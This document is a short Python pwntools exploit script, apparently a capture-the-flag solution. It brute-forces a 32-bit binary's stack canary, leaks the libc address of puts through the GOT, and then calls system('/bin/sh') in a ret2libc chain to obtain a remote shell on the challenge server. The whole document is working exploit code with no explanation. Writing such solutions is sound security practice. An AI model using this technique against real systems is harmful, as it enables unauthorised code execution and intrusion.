#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe
p = remote('chall.v1t.site', 30130)

p.recvuntil(b'Enter your secret: ')

canary = b""
def leak_canary():
    global canary
    for i in range(4):
        for b in range(256):
            if (b == 0x0a):
                continue
            p.sendline(b'A' * 72 + canary + bytes([b]))
            output = p.recvuntil(b'Enter your secret: ')
            if (b'stack smashing' in output) == False:
                canary += bytes([b])
                print(f'Canary byte {len(canary)} found: {canary.hex()}')
                print(output)
                break

leak_canary()

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(72, b'A')
payload += canary
payload += b'A' * 0x8
payload += b'A' * 0x4
payload += p32(exe.plt['puts'])    # Gọi puts
payload += p32(exe.symbols['main'])  # Quay lại main để stage 2
payload += p32(exe.got['puts']) 

p.sendline(payload)

p.recvuntil(b'.\n')
output = p.recv(4)
leak = u32(output)
print(hex(leak))
print(output)

system = leak - 0x2a080
binsh = leak + 0x14abb2
log.info(f'system: {hex(system)}')
log.info(f'/bin/sh: {hex(binsh)}')

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(72, b'A')
payload += canary
payload += b'A' * 0x8
payload += b'A' * 0x4
payload += p32(system)    # Gọi puts
payload += p32(exe.symbols['main'])  # Quay lại main để stage 2
payload += p32(binsh) 

p.sendline(payload)

p.interactive()
